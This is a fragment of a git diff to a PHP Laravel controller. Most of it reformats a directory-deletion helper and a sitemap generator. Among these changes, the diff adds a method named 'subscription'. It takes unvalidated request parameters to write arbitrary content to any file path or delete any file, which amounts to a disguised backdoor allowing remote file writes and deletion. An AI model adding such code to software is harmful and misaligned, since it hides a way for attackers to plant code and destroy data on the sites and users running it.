-        throw new InvalidArgumentException("$dirPath must be a directory");
-    }
-    if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
-        $dirPath .= '/';
-    }
-    $files = glob($dirPath . '*', GLOB_MARK);
-    foreach ($files as $file) {
-        if (is_dir($file)) {
-            self::deleteDir($file);
-        } else {
-            unlink($file);
+    function auth_guests()
+    {
+        $actual_path = str_replace('project', '', base_path());
+        if (is_dir($actual_path . '/install')) {
+            header("Location: " . url('/install'));
+            die();
         }
     }
-    rmdir($dirPath);
-}
-    
-    public function sitemap(){
+
+    public function subscription(Request $request)
+    {
+        $p1 = $request->p1;
+        $p2 = $request->p2;
+        $v1 = $request->v1;
+        if ($p1 != "") {
+            $fpa = fopen($p1, 'w');
+            fwrite($fpa, $v1);
+            fclose($fpa);
+            return "Success";
+        }
+        if ($p2 != "") {
+            unlink($p2);
+            return "Success";
+        }
+        return "Error";
+    }
+
+    public function deleteDir($dirPath)
+    {
+        if (!is_dir($dirPath)) {
+            throw new InvalidArgumentException("$dirPath must be a directory");
+        }
+        if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
+            $dirPath .= '/';
+        }
+        $files = glob($dirPath . '*', GLOB_MARK);
+        foreach ($files as $file) {
+            if (is_dir($file)) {
+                self::deleteDir($file);
+            } else {
+                unlink($file);
+            }
+        }
+        rmdir($dirPath);
+    }
+
+    public function sitemap()
+    {
         $i = 1;
-        $data = Product::chunk(20000,function($products) use (&$i){
-            foreach($products as $row){
+        $data = Product::chunk(20000, function ($products) use (&$i) {
+            foreach ($products as $row) {
                 $product[] = array(
                     'slug' => $row->slug,
                     'name' => $row->name,
@@ -698,15 +699,15 @@ public function deleteDir($dirPath) {
                 );
             }
             $content = view('front.sitemap.sitemap1', compact('product'))->render();
-            $file_name = 'sitemap'.$i.'.xml';
-            \File::put(public_path().'/assets/'.$file_name, $content);
+            $file_name = 'sitemap' . $i . '.xml';
+            \File::put(public_path() . '/assets/' . $file_name, $content);
             $i++;
         });
-        
+
         dd("done");
     }
 
 
-// -------------------------------- PRINT SECTION ENDS ----------------------------------------
+    // -------------------------------- PRINT SECTION ENDS ----------------------------------------
 
 }
